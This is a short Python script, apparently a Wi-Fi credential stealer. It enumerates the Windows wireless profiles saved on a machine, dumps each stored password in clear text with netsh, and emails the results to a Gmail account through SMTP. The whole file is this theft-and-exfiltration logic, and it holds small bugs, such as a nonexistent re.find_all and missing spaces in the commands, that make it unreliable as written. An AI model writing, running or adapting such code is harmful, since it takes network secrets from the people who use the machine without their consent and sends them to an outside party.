
import subprocess
import smtplib
import re

def sendMail(email, passwd, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, passwd)
	server.sendmail(email, email, message)
	server.quit()


#command = "netsh wlan show profile SN 6 key=clear"
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networkNames = re.find_all("(?:profile\s*:\s)(.*)", networks)

result = ""
for network in networkNames:
	command = "netsh wlan show profile" + network + "key=clear"
	result += subprocess.check_output(command, shell=True)


# For this to work, you need allow less secure apps in gmail
sendMail(<mail>, <passwd>, result)
